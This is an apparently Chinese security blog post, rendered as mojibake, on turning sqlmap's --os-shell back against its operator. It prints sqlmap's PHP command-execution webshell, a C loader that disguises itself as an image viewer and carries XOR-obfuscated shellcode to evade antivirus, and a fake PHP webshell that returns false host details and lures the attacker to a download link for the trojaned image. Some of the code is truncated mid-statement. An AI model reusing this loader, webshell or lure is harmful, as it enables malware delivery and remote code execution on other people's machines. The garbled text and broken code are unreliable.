# sqlmap --os-shellååˆ¶å°æ€è·¯
|
##### è¯‘æ–‡å£°æ˜
æœ¬æ–‡æ˜¯ç¿»è¯‘æ–‡ç« 
è¯‘æ–‡ä»…ä¾›å‚è€ƒï¼Œå…·ä½“å†…å®¹è¡¨è¾¾ä»¥åŠå«ä¹‰åŸæ–‡ä¸ºå‡†ã€‚
## å‰è¨€
ä¹‹å‰æœ‰çœ‹åˆ°gobyååˆ¶å’Œæ¾é¼ Aå¸ˆå‚…[èšå‰‘ååˆ¶](https://mp.weixin.qq.com/s/WNv9nPWvKudwimtYTd1zDQ)çš„æ–‡ç« ï¼Œå†æƒ³åˆ°ä¹‹å‰å†™è¿‡sqlmapçš„shellå…æ€ï¼Œè§‰å¾—æ€è·¯å…¶å®å·®ä¸å¤šï¼Œå°±å†™ä¸€ç¯‡sqlmapçš„ååˆ¶å§ã€‚
## sqlmapæµé‡åˆ†æ
ï¼ˆå…¶å®å¯ä»¥é€šè¿‡åˆ†æè§£å¯†åsqlmapå†…ç½®çš„backdooråé—¨æ–‡ä»¶ï¼ˆ[æ–‡ç« é“¾æ¥](https://www.freebuf.com/articles/web/291576.html)ï¼‰ï¼‰
å…·ä½“sqlmapçš„æ”»å‡»æµç¨‹å·®ä¸å¤šæ˜¯è¿™æ ·ï¼š
>   1. æµ‹è¯•é“¾æ¥æ˜¯å¦èƒ½å¤Ÿè®¿é—®
>   2. åˆ¤æ–­æ“ä½œç³»ç»Ÿç‰ˆæœ¬
>   3. ä¼ é€’ä¸€ä¸ªæ•°ç»„ï¼Œå°è¯•çˆ†ç»å¯¹è·¯å¾„
>   4. æŒ‡å®šä¸Šä¼ è·¯å¾„
>   5. ä½¿ç”¨lines terminated by å†™å…¥ä¸€ä¸ªphpæ–‡ä»¶ï¼Œè¯¥phpæ–‡ä»¶å¯ä»¥è¿›è¡Œæ–‡ä»¶ä¸Šä¼ 
>   6. å°è¯•æ‰¾åˆ°ä¸Šä¼ çš„æ–‡ä»¶çš„è®¿é—®è·¯å¾„ï¼›ç›´åˆ°æ‰¾åˆ°æ­£ç¡®çš„è·¯å¾„
>   7. é€šè¿‡ä¸Šä¼ çš„ä¸´æ—¶æ–‡ä»¶ï¼Œå°è¯•ä¸Šä¼ å¦å¤–ä¸€ä¸ªphpæ–‡ä»¶ï¼Œ è¯¥æ–‡ä»¶å¯ä»¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œ
>   8. å°è¯•è¿›è¡Œå‘½ä»¤æ‰§è¡Œ echo command execution test
>   9. ç›´æ¥è¾“å…¥å¯¹åº”çš„å‘½ä»¤
>   10. é€€å‡º -â€“os-shellååˆ é™¤å‘½ä»¤é©¬
>
ç„¶åæˆ‘ä»¬ååˆ¶æ€è·¯å…¶å®å¤§æ¦‚åˆ†ä¸ºä¸¤ä¸ª
  * ä¸€ä¸ªæ˜¯é€šè¿‡æ‰“å¼€çš„é¡µé¢åµŒå…¥jsæ¥ç›´æ¥æ‰§è¡Œå‘½ä»¤
  * å¦ä¸€ä¸ªæ˜¯é€šè¿‡æ‰“å¼€é’“é±¼é¡µé¢ï¼ˆæ¯”å¦‚flashé’“é±¼é‚£ç§ï¼‰
è¿™ä¸¤ä¸ªç›¸æ¯”è€Œè¨€å…¶å®å„æœ‰ä¼˜ç‚¹ï¼Œä½†æˆ‘å†³å®šç»“åˆä¸€ä¸‹ğŸ˜¯
**é€šè¿‡æ‰“å¼€çš„é¡µé¢æ¥ä¸‹è½½å›¾ç‰‡é©¬ï¼Œç„¶åè¿›è¡Œrce**
## åˆ¶ä½œ
å›¾ç‰‡é©¬é‡Œé¢çš„ç¨‹åºç”¨Cå†™çš„ï¼Œç”¨å¼‚æˆ–åšäº†å…æ€ï¼ˆå’Œå…¶ä»–å¸ˆå‚…å­¦ä¹ çš„ï¼‰
è¿™ä¸ªæ˜¯å¼•ç”¨çš„å¤´æ–‡ä»¶
    //{{NO_DEPENDENCIES}}
    //
    #define IDR_IMAGE1                      101
    #define IDI_ICON1                       102
    // Next default values for new objects
    // 
    #ifdef APSTUDIO_INVOKED
    #ifndef APSTUDIO_READONLY_SYMBOLS
    #define _APS_NEXT_RESOURCE_VALUE        103
    #define _APS_NEXT_COMMAND_VALUE         40001
    #define _APS_NEXT_CONTROL_VALUE         1001
    #define _APS_NEXT_SYMED_VALUE           101
    #endif
    #endif
è¿™ä¸ªæ‰æ˜¯Cè„šæœ¬
    #include
    #include
    #include
    #include "resource.h"
    using namespace std;
    void image() {
        IMAGE img;
        loadimage(&img, L"IMAGE", MAKEINTRESOURCE(IDR_IMAGE1));
        int w, h;
        w = img.getwidth();
        h = img.getheight();
        initgraph(w, h);
        putimage(0, 0, &img);
        getchar();
        closegraph();
    }
    int main()
    {
        unsigned char shellc0de[] = "\x1c\x65\x9d\x1c\xd5\xbd\x89\xab\xab\xab\x1c\xd9\x51\xbb\xab\xab\xab\x1c\xef\x4c\xc8\xae\xed\x37\x61\xee\x24\x1c\x65\x0c\x73\x1c\x79\xac\xab\xab\xab\xb6\xa0\xb0\x80\x2d\x09\xc7\x89\x2e\x24\x4c\xc8\xef\xbc\x76\x31\xbc\x75\x1a\x80\x9f\x3f\x52\x29\x65\x76\x2c\x80\x25\xbf\x2f\x29\x65\x76\x6c\x80\x25\x9f\x67\x29\xe1\x93\x06\x82\xe3\xdc\xfe\x29\xdf\xe4\xe0\xf4\xcf\x91\x35\x4d\xce\x65\x8d\x01\xa3\xac\x36\xa0\x0c\xc9\x1e\x89\xff\xa5\xbc\x33\xce\xaf\x0e\xf4\xe6\xec\xe7\xea\x6e\xac\x4c\xc8\xae\xa5\xb2\xa1\x9a\x43\x04\xc9\x7e\xbd\xbc\x29\xf6\x60\xc7\x88\x8e\xa4\x36\xb1\x0d\x72\x04\x37\x67\xac\xbc\x55\x66\x6c\x4d\x1e\xe3\xdc\xfe\x29\xdf\xe4\xe0\x89\x6f\x24\x3a\x20\xef\xe5\x74\x28\xdb\x1c\x7b\x62\xa2\x00\x44\x8d\x97\x3c\x42\xb9\xb6\x60\xc7\x88\x8a\xa4\x36\xb1\x88\x65\xc7\xc4\xe6\xa9\xbc\x21\xf2\x6d\x4d\x18\xef\x66\x33\xe9\xa6\x25\x9c\x89\xf6\xac\x6f\x3f\xb7\x7e\x0d\x90\xef\xb4\x76\x3b\xa6\xa7\xa0\xe8\xef\xbf\xc8\x81\xb6\x65\x15\x92\xe6\x66\x25\x88\xb9\xdb\xb3\x37\xf3\xa5\x8d\x60\xee\x24\x4c\xc8\xae\xed\x37\x29\x63\xa9\x4d\xc9\xae\xed\x76\xdb\xdf\xaf\x23\x4f\x51\x38\x8c\x81\xf3\x0e\x46\x89\x14\x4b\xa2\xdc\x73\xdb\x99\x80\x2d\x29\x1f\x5d\xe8\x58\x46\x48\x55\x0d\x42\x64\x55\x63\x5f\xba\xc1\x87\x37\x38\xaf\xad\x96\x37\x7b\x8e\x56\x0d\x8d\x0a\x29\xb0\xcb\xed\x37\x61\xee\x24";
        unsigned char key[] = "\x09\xab";
        unsigned char aa[] = "\x32\xff";
        DWORD dw_size = sizeof shellc0de;
        int i;
        for (i = 0; i sqlmap file uploaderto directory:  ";
    }
ç„¶åæ‰¾ç»å¯¹è·¯å¾„ï¼Œä¸Šä¼ ä¸‹é¢è¿™ä¸ªçœŸæ­£çš„å‘½ä»¤é©¬ã€‚
    &1\n";// å°†å‘½ä»¤ä¸ 2>&1è¿›è¡Œæ‹¼æ¥
    function f($n) {
        global $z;
        return is_callable($n)and!in_array($n,$z);//is_callableå‡½æ•°æ£€æŸ¥f($n)åœ¨å½“å‰ç¯å¢ƒä¸­æ˜¯å¦å¯è°ƒç”¨
    }
    if(f("system")) {
        ob_start();
        system($c);
        $w=ob_get_clean();//è¿”å›è¾“å‡ºç¼“å†²åŒºçš„å†…å®¹,æ¸…ç©ºï¼ˆæ“¦é™¤ï¼‰ç¼“å†²åŒºå¹¶å…³é—­è¾“å‡ºç¼“å†²
    } elseif(f("proc_open")) {
        $y=proc_open($c,array(array(pipe,r),array(pipe,w),array(pipe,w)),$t);
        $w=NULL;
        while(!feof($t[1])) {//feofå‡½æ•°æ£€æŸ¥æ˜¯å¦å·²åˆ°è¾¾æ–‡ä»¶æœ«å°¾ï¼ˆEOF)
            $w.=fread($t[1],512);
        }
        @proc_close($y);
    } elseif(f("shell_exec")) {
        $w=shell_exec($c);
    } elseif(f("passthru")) {
        ob_start();
        passthru($c);
        $w=ob_get_clean();
    } elseif(f("popen")) {//popen()å‡½æ•°é€šè¿‡åˆ›å»ºä¸€ä¸ªç®¡é“ï¼Œè°ƒç”¨ fork äº§ç”Ÿä¸€ä¸ªå­è¿›ç¨‹ï¼Œæ‰§è¡Œä¸€ä¸ª shell ä»¥ è¿è¡Œå‘½ä»¤ æ¥å¼€å¯ä¸€ä¸ªè¿›ç¨‹ã€‚è¿™ä¸ªè¿›ç¨‹å¿…é¡»ç”± pclose () å‡½æ•°å…³é—­
        $x=popen($c,r);
        $w=NULL;
        if(is_resource($x)) {
            while(!feof($x)) {
                $w.=fread($x,512);//fread() å‡½æ•°è¯»å–æ–‡ä»¶ï¼ˆå¯å®‰å…¨ç”¨äºäºŒè¿›åˆ¶æ–‡ä»¶ï¼‰ã€‚512:è¯»å–çš„æœ€å¤§å­—èŠ‚æ•°ã€‚
            }
        }
        @pclose($x);// pclose()å‡½æ•°å…³é—­æ ‡å‡† I/O æµï¼Œç­‰å¾…å‘½ä»¤æ‰§è¡Œç»“æŸï¼Œç„¶åè¿”å› shell çš„ç»ˆæ­¢çŠ¶æ€ã€‚
    } elseif(f("exec")) {
        $w=array();
        exec($c,$w);
        $w=join(chr(10),$w).chr(10);
    } else {
        $w=0;
    }
    echo"$w";
    ?>
è€Œæœ€åçš„è¿”å›åŒ…ï¼Œwebshellè·å–äº†ç½‘ç«™ç›®å½•ã€æ•°æ®åº“ç±»å‹ç­‰ä¿¡æ¯ã€‚
è¿™ä¸ªæ—¶å€™ï¼Œæˆ‘ä»¬å¯ä»¥å†™ä¸€ä¸ªä¼ªé€ çš„sqlmapçš„â€webshellâ€œ
    echo "SORRY"; preg_match('/system|proc_open|shell|php|sys|shell_exec|user|passthru|create|upload|file|popen|static|get|sleep|exec|eval|str|set/i',$A,$B);
        $c="$B[0]";
        $key= str_replace(['"', '.', 'system', 'proc_open', 'shell', 'shell_exec', 'popen', 'exec', 'passthru', ' ', ";"], "", $c);//å°†å‘½ä»¤æ‰§è¡Œå‡½æ•°æ›¿æ¢æ‰
        $txt='D:/IIS5.0/WWW'."\t".'C:D:E:F:'."\t".'Windows NT LAPTOP-46FFII5G 6.2 build 9200 (Windows 8 Business Edition) i586'."\t";
        echo "$txt";//ä¼ªé€ è¿é€š
ç„¶åæ­é…ä¸ŠæŒ‚é©¬å›¾ç‰‡çš„ä¸‹è½½é“¾æ¥
    $iscmd="%(.*)127;%si";
    if (preg_match($iscmd,$A)!=0) {
        preg_match('/system|proc_open|shell|php|sys|shell_exec|user|passthru|create|upload|file|popen|static|get|sleep|exec|eval|str|set/i',$Aï¼Œ$B);
        $c="$B[0]";
        $key= str_replace(['"', '.', 'system', 'proc_open', 'shell', 'shell_exec', 'popen', 'exec', 'passthru', ' ', ";"], "", $c);//å°†å‘½ä»¤æ‰§è¡Œå‡½æ•°æ›¿æ¢æ‰
        $payload='http://shell.com/index.html';
        echo 'WARN://'."\n".'æ•°æ®ä¸Šä¼ æˆåŠŸï¼Œä½†ä¸flashè¿›è¡Œäº¤äº’ï¼Œè¯·è®¿é—®è¯¥ç½‘å€è¿›è¡Œshellé“¾æ¥ã€‚SQLMAPï¼š'."$payload";
## ä¸€ä»£ç›®
phpå†™çš„ä¸å¥½ï¼Œå¯èƒ½æœ‰ç‚¹ä¸ç¬¦åˆsqlmapè¿”å›åŒ…çš„å½¢å¼ï¼Œä»¥åæˆ‘æ…¢æ…¢æ”¹å§
    <?php
    $A=urldecode(file_get_contents("php://input"));
    $iscmd="%(.*)127;%si";
    if (preg_match($iscmd,$A)!=0) {
        preg_match('/system|proc_open|shell|php|sys|shell_exec|user|passthru|create|upload|file|popen|static|get|sleep|exec|eval|str|set/i',$Aï¼Œ$B);
        $c="$B[0]";
        $key= str_replace(['"', '.', 'system', 'proc_open', 'shell', 'shell_exec', 'popen', 'exec', 'passthru', ' ', ";"], "", $c);//å°†å‘½ä»¤æ‰§è¡Œå‡½æ•°æ›¿æ¢æ‰
        $payload='http://exp.com/index.html';
        echo 'WARN://'."\n".'æ•°æ®ä¸Šä¼ æˆåŠŸï¼Œä½†ä¸flashè¿›è¡Œäº¤äº’ï¼Œè¯·è®¿é—®è¯¥ç½‘å€è¿›è¡Œshellé“¾æ¥ã€‚SQLMAPï¼š'."$payload";//éšä¾¿å†™ï¼Œè¯±æƒ‘åˆ«äººç‚¹è¿›å»ã€‚åæ­£æˆ‘æ˜¯ä¸ä¿¡sqlmapä¼šç”¨flash
    } else {
        echo "SORRY";
        preg_match('/system|proc_open|shell|php|sys|shell_exec|user|passthru|create|upload|file|popen|static|get|sleep|exec|eval|str|set/i',$A,$B);
        $c="$B[0]";
        $key= str_replace(['"', '.', 'system', 'proc_open', 'shell', 'shell_exec', 'popen', 'exec', 'passthru', ' ', ";"], "", $c);//å°†å‘½ä»¤æ‰§è¡Œå‡½æ•°æ›¿æ¢æ‰
        $txt='D:/IIS5.0/WWW'."\t".'C:D:E:F:'."\t".'Windows NT LAPTOP-46FFII5G 6.2 build 9200 (Windows 8 Business Edition) i586'."\t";
        echo "$txt";//ä¼ªé€ è¿é€šæ€§
    }
## åæ€
å…¶å®è¿™ä¸ªæƒ³æ³•æˆ‘æ„Ÿè§‰å¯èƒ½ä¸å¤ªå¥½ï¼Œåœ¨è¿é€šæ€§å¤„å†™çš„å¯èƒ½æœ‰é—®é¢˜ï¼Œæˆ‘çš„wiresharkæœ‰ç‚¹é—®é¢˜ï¼Œä¸€ç›´æŠ“ä¸äº†æœ¬åœ°çš„æµé‡åŒ…ï¼Œåªèƒ½çœ‹æˆ‘ç»ˆç«¯è¿”å›çš„å†…å®¹è¿›è¡Œä¼ªé€ äº†=_=
å¦‚æœå¯ä»¥çš„è¯ï¼Œå¸ˆå‚…ä»¬å¯ä»¥æŠ“æœ¬åœ°æµé‡åŒ…ï¼Œç„¶åè‡ªå·±æ”¹å†™ä¼ªé€ è¿é€šæ€§çš„è„šæœ¬ã€‚